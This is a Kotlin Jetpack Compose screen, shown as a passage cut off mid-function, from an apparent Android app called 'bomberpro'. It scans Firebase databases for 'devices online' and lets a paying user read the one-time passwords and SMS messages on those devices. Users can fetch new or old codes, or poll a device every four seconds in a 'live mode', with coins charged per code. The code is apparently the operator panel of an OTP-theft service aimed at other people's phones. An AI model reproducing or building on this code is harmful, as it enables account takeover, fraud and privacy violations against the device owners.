package com.sanji.bomberpro.ui.otp

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Star
import androidx.compose.material.icons.filled.StarBorder
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.sanji.bomberpro.data.OtpMessage
import com.sanji.bomberpro.services.Device
import com.sanji.bomberpro.services.OtpFavoritesService
import com.sanji.bomberpro.services.OtpService
import com.sanji.bomberpro.services.RealtimeDbService
import com.sanji.bomberpro.services.UserDataService
import com.sanji.bomberpro.theme.LocalSanjiColors
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private enum class OtpView { LIST, DETAIL, RESULT, LIVE, FAVS, KEYWORD }

private val IST_FMT_SHORT = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault())
private val IST_FMT_FULL = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())

private fun formatIstShort(ts: Long): String =
    try { IST_FMT_SHORT.format(Date(ts * 1000L)) } catch (_: Exception) { "—" }

private fun formatIstFull(ts: Long): String =
    try { IST_FMT_FULL.format(Date(ts * 1000L)) } catch (_: Exception) { "—" }

@Composable
fun OtpScreen(
    uid: String,
    userName: String,
    userEmail: String,
    isAdmin: Boolean,
    onBack: () -> Unit,
) {
    val colors = LocalSanjiColors.current
    val scope = rememberCoroutineScope()
    val context = LocalContext.current

    val userData = remember { UserDataService() }
    val otpService = remember { OtpService() }
    val rtdb = remember { RealtimeDbService() }
    val favSvc = remember { OtpFavoritesService() }

    var view by remember { mutableStateOf(OtpView.LIST) }
    var devices by remember { mutableStateOf<List<Device>>(emptyList()) }
    var selected by remember { mutableStateOf<Device?>(null) }
    var scanning by remember { mutableStateOf(false) }
    var error by remember { mutableStateOf<String?>(null) }
    var coins by remember { mutableStateOf(0) }
    var otpCost by remember { mutableStateOf(1) }
    var searchQuery by remember { mutableStateOf("") }
    var resultList by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var resultAllMsgs by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var lastMode by remember { mutableStateOf("") }
    var liveRunning by remember { mutableStateOf(false) }
    var liveOtps by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
    var liveJob by remember { mutableStateOf<Job?>(null) }
    var liveCoinsSpent by remember { mutableStateOf(0) }
    var favorites by remember { mutableStateOf<List<com.sanji.bomberpro.services.OtpFavorite>>(emptyList()) }
    var keyword by remember { mutableStateOf("") }
    var keywordInput by remember { mutableStateOf("") }
    var loadingAction by remember { mutableStateOf(false) }

    // Local function — must be declared before use
    suspend fun scanDevices() {
        scanning = true
        error = null
        try {
            val fbs = rtdb.loadFirebases()
            devices = rtdb.scanAll(fbs)
            if (devices.isEmpty()) error = "No devices online"
        } catch (e: Exception) {
            error = "Scan failed: ${e.message}"
        } finally {
            scanning = false
        }
    }

    fun copyToClipboard(label: String, value: String) {
        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(ClipData.newPlainText(label, value))
    }

    LaunchedEffect(Unit) {
        coins = userData.getCoins(uid)
        otpCost = userData.getGlobalSettings().otpCost
        keyword = favSvc.getWatchKeyword(uid)
        keywordInput = keyword
        favorites = favSvc.listFavorites(uid)
        scanDevices()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(colors.background)
            .padding(16.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            IconButton(onClick = {
                if (view == OtpView.LIST) onBack()
                else view = OtpView.LIST
            }) {
                Icon(Icons.Default.ArrowBack, "Back", tint = colors.onBackground)
            }
            Spacer(Modifier.weight(1f))
            when (view) {
                OtpView.LIST -> {
                    IconButton(onClick = { view = OtpView.KEYWORD }) {
                        Icon(Icons.Default.Notifications, "Keyword", tint = colors.primary)
                    }
                    IconButton(onClick = { view = OtpView.FAVS }) {
                        Icon(Icons.Default.Star, "Favorites", tint = colors.primary)
                    }
                    IconButton(onClick = { scope.launch { scanDevices() } }) {
                        Icon(Icons.Default.Refresh, "Refresh", tint = colors.primary)
                    }
                }
                else -> Unit
            }
        }

        Spacer(Modifier.height(8.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text(
                text = when (view) {
                    OtpView.LIST -> "Get OTP"
                    OtpView.DETAIL -> "Device"
                    OtpView.RESULT -> if (lastMode == "new") "NEW OTPs" else if (lastMode == "old") "OLD OTPs" else "Messages"
                    OtpView.LIVE -> "Live Mode"
                    OtpView.FAVS -> "Favorites"
                    OtpView.KEYWORD -> "Keyword Watch"
                },
                fontSize = 18.sp,
                fontWeight = FontWeight.Bold,
                color = colors.onBackground,
            )
            Surface(
                shape = RoundedCornerShape(20.dp),
                color = colors.primary.copy(alpha = 0.15f),
            ) {
                Row(
                    modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Text(
                        text = "🪙 $coins",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = colors.primary,
                    )
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        when (view) {
            OtpView.LIST -> DeviceListSection(
                devices = devices,
                scanning = scanning,
                searchQuery = searchQuery,
                onSearchChange = { searchQuery = it },
                error = error,
                onRefresh = { scope.launch { scanDevices() } },
                onSelect = { dv ->
                    selected = dv
                    view = OtpView.DETAIL
                },
            )

            OtpView.DETAIL -> {
                val dv = selected
                if (dv == null) {
                    view = OtpView.LIST
                } else {
                    DeviceDetailSection(
                        device = dv,
                        otpCost = otpCost,
                        coins = coins,
                        loading = loadingAction,
                        onFetchNew = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val found = otpService.collectToday(dv)
                                    val all = otpService.collectAll(dv)
                                    if (found.isNotEmpty() && !isAdmin) {
                                        if (coins < otpCost) {
                                            error = "Need $otpCost coins (have $coins)"
                                        } else if (userData.deductCoins(uid, otpCost, "otp-fetch-new")) {
                                            coins = userData.getCoins(uid)
                                            val first = found.first()
                                            userData.saveOtpHistory(
                                                uid = uid,
                                                otp = first.otps.firstOrNull() ?: "?",
                                                sender = first.sender,
                                                deviceName = dv.deviceName,
                                                deviceShort = dv.shortId,
                                                devicePhone = dv.phone ?: "",
                                                firebaseLabel = dv.firebaseLabel,
                                                mode = "new",
                                                cost = otpCost,
                                            )
                                        }
                                    }
                                    resultList = found
                                    resultAllMsgs = all
                                    lastMode = "new"
                                    view = OtpView.RESULT
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onFetchOld = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val found = otpService.collectAllOtp(dv)
                                    val all = otpService.collectAll(dv)
                                    if (found.isNotEmpty() && !isAdmin) {
                                        if (coins < otpCost) {
                                            error = "Need $otpCost coins (have $coins)"
                                        } else if (userData.deductCoins(uid, otpCost, "otp-fetch-old")) {
                                            coins = userData.getCoins(uid)
                                            val first = found.first()
                                            userData.saveOtpHistory(
                                                uid = uid,
                                                otp = first.otps.firstOrNull() ?: "?",
                                                sender = first.sender,
                                                deviceName = dv.deviceName,
                                                deviceShort = dv.shortId,
                                                devicePhone = dv.phone ?: "",
                                                firebaseLabel = dv.firebaseLabel,
                                                mode = "old",
                                                cost = otpCost,
                                            )
                                        }
                                    }
                                    resultList = found
                                    resultAllMsgs = all
                                    lastMode = "old"
                                    view = OtpView.RESULT
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onMessages = {
                            scope.launch {
                                loadingAction = true
                                error = null
                                try {
                                    val all = otpService.collectAll(dv)
                                    resultList = all
                                    resultAllMsgs = all
                                    lastMode = "msgs"
                                    view = OtpView.RESULT
                                } finally {
                                    loadingAction = false
                                }
                            }
                        },
                        onLive = {
                            liveOtps = emptyList()
                            liveCoinsSpent = 0
                            liveRunning = true
                            view = OtpView.LIVE
                            val startedTs = System.currentTimeMillis() / 1000L
                            liveJob = scope.launch {
                                try {
                                    while (liveRunning) {
                                        val newFound = otpService.collectSince(dv, startedTs)
                                        val toAdd = newFound.filter {
                                            !liveOtps.any { o -> o.hash == it.hash }
                                        }
                                        if (toAdd.isNotEmpty()) {
                                            for (o in toAdd) {
                                                if (!isAdmin) {
                                                    if (coins >= otpCost) {
                                                        if (userData.deductCoins(uid, otpCost, "otp-live")) {
                                                            coins = userData.getCoins(uid)
                                                            liveCoinsSpent += otpCost
                                                            userData.saveOtpHistory(
                                                                uid = uid,
                                                                otp = o.otps.firstOrNull() ?: "?",
                                                                sender = o.sender,
                                                                deviceName = dv.deviceName,
                                                                deviceShort = dv.shortId,
                                                                devicePhone = dv.phone ?: "",
                                                                firebaseLabel = dv.firebaseLabel,
                                                                mode = "live",
                                                                cost = otpCost,
                                                            )
                                                        }
                                                    }
                                                } else {
                                                    userData.saveOtpHistory(
                                                        uid = uid,
                                                        otp = o.otps.firstOrNull() ?: "?",
                                                        sender = o.sender,
                                                        deviceName = dv.deviceName,
                                                        deviceShort = dv.shortId,
                                                        devicePhone = dv.phone ?: "",
                                                        firebaseLabel = dv.firebaseLabel,
                                                        mode = "live",
                                                        cost = 0,
                                                    )
                                                }
                                            }
                                            liveOtps = liveOtps + toAdd
                                        }
                                        delay(4000)
                                    }
                                } catch (_: Exception) {}
                            }
                        },
                    )
                }
            }

            OtpView.RESULT -> FetchResultSection(
                mode = lastMode,
                messages = if (lastMode == "msgs") resultAllMsgs else resultList,
                onCopy = { code -> copyToClipboard("OTP", code) },
                onFavorite = { m ->
                    scope.launch {
                        val otpCode = m.otps.firstOrNull() ?: return@launch
                        favSvc.addFavorite(uid, otpCode, m.sender, selected?.deviceName ?: "")
                        favorites = favSvc.listFavorites(uid)
                    }
                },
                onBack = { view = OtpView.DETAIL },
            )

            OtpView.LIVE -> LiveSection(
                otps = liveOtps,
                coinsSpent = liveCoinsSpent,
                coinsLeft = coins,
                running = liveRunning,
                onCopy = { code -> copyToClipboard("OTP", code) },
                onStop = {
                    liveRunning = false
                    liveJob?.cancel()
                    liveJob = null
                },
                onBack = {
                    liveRunning = false
                    liveJob?.cancel()
                    liveJob = null
                    view = OtpView.DETAIL
                },
            )

            OtpView.FAVS -> FavoritesSection(
                favorites = favorites,
                onCopy = { otp -> copyToClipboard("OTP", otp) },
                onRemove = { favId ->
                    scope.launch {
                        favSvc.removeFavorite(uid, favId)
                        favorites = favSvc.listFavorites(uid)
                    }
                },
            )

            OtpView.KEYWORD -> KeywordSection(
                keywordInput = keywordInput,
                onChange = { keywordInput = it },
                currentKeyword = keyword,
                onSave = {
                    scope.launch {
                        val ok = favSvc.setWatchKeyword(uid, keywordInput)
                        if (ok) {
                            keyword = keywordInput.trim().lowercase()
                            view = OtpView.LIST
                        }
                    }
                },
                onClear = {
                    scope.launch {
                        favSvc.setWatchKeyword(uid, "")
                        keyword = ""
                        keywordInput = ""
                    }
                },
            )
        }

        if (error != null) {
            Spacer(Modifier.height(8.dp))
            Text(error!!, color = colors.error, fontSize = 12.sp)
        }
    }
}

@Composable
private fun DeviceListSection(
    devices: List<Device>,
    scanning: Boolean,
    searchQuery: String,
    onSearchChange: (String) -> Unit,
    error: String?,
    onRefresh: () -> Unit,
    onSelect: (Device) -> Unit,
) {
    val colors = LocalSanjiColors.current
    val filtered = if (searchQuery.isBlank()) devices else devices.filter {
        it.deviceName.contains(searchQuery, ignoreCase = true) ||
                (it.phone?.contains(searchQuery, ignoreCase = true) == true) ||
                it.shortId.contains(searchQuery, ignoreCase = true)
    }

    OutlinedTextField(
        value = searchQuery,
        onValueChange = onSearchChange,
        leadingIcon = { Icon(Icons.Default.Search, null, tint = colors.onSurfaceVariant) },
        placeholder = { Text("Search device / phone / code") },
        singleLine = true,
        modifier = Modifier.fillMaxWidth(),
        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text),
    )

    Spacer(Modifier.height(12.dp))

    if (scanning) {
        Box(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.Center,
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                CircularProgressIndicator(color = colors.primary)
                Spacer(Modifier.height(12.dp))
                Text("Scanning devices…", color = colors.onSurfaceVariant, fontSize = 12.sp)
            }
        }
        return